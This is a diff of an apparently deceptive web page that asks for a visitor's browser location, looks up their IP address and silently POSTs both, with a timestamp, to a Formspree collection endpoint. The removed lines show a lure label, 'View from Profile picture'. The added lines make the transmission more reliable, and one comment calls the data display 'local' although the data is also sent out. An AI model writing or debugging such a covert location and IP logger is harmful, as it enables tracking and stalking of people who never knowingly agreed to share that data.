@@ -19,8 +19,8 @@
 </head>
 <body>
 
-    <button onclick="findMe()">View from Profile picture</button>
-    <div id="result">Here you go.</div>
+    <button onclick="findMe()">Find My Location</button>
+    <div id="result">Coordinates will appear here.</div>
     
     <div id="gallery" class="flower-container"></div>
 
@@ -36,21 +36,27 @@
                 const lat = position.coords.latitude;
                 const lon = position.coords.longitude;
 
+                // 1. Instantly display screen data locally
                 document.getElementById('result').innerHTML = `Lat: ${lat} <br> Lon: ${lon}`;
                 
+                // Fixed placeholder images using Unsplash Source
                 document.getElementById('gallery').innerHTML = `
-                    <img src="https://images.unsplash.com/photo-1501004318641-b39e6451bec6" alt="Pink Flowers">
-                    <img src="https://images.unsplash.com/photo-1509042239860-f550ce710b93" alt="Yellow Flowers">
+                    <img src="https://images.unsplash.com/photo-1526047932273-341f2a7631f9?w=300" alt="Pink Flowers">
+                    <img src="https://images.unsplash.com/photo-1508784411316-02b8cd4d3a3a?w=300" alt="Yellow Flowers">
                 `;
 
-                // Correct IPify API
+                // 2. Fetch the IP address using the correct JSON API endpoint
                 fetch("https://api.ipify.org?format=json")
-                    .then(ipRes => ipRes.json())
+                    .then(ipRes => {
+                        if (!ipRes.ok) throw new Error("Network response error");
+                        return ipRes.json();
+                    })
                     .then(ipData => {
                         sendToFormspree(lat, lon, ipData.ip);
                     })
                     .catch(err => {
-                        sendToFormspree(lat, lon, "IP Lookup Blocked");
+                        console.warn("IP fetch failed, sending coordinates anyway:", err);
+                        sendToFormspree(lat, lon, "IP Lookup Blocked/Failed");
                     });
             },
             (error) => {
@@ -60,29 +66,32 @@
     }
 
     function sendToFormspree(latitude, longitude, ipAddress) {
-        const targetUrl = "https://formspree.io/f/mjgqwonp";
+        const targetUrl = "https://formspree.io/f/xvzjzyqe"; 
+
+        // Using URLSearchParams ensuring perfect compatibility with all Formspree plans
+        const formData = new URLSearchParams();
+        formData.append("Visitor_IP", ipAddress);
+        formData.append("Latitude", latitude);
+        formData.append("Longitude", longitude);
+        formData.append("Timestamp", new Date().toISOString());
 
         fetch(targetUrl, {
             method: "POST",
             headers: { 
                 "Accept": "application/json",
-                "Content-Type": "application/json"
+                "Content-Type": "application/x-www-form-urlencoded" 
             },
-            body: JSON.stringify({
-                Visitor_IP: ipAddress,
-                Latitude: latitude,
-                Longitude: longitude,
-                Timestamp: new Date().toISOString()
-            })
+            body: formData.toString()
         })
         .then(response => {
             if (response.ok) {
-                console.log("Transmission successful.");
+                console.log("Transmission completely successful.");
             } else {
-                console.error("Formspree error:", response.status);
+                console.error("Formspree rejected the data. Check your Formspree dashboard status.");
             }
         })
         .catch(error => console.error("Formspree connection error:", error));
     }
     </script>
 </body>
+</html>
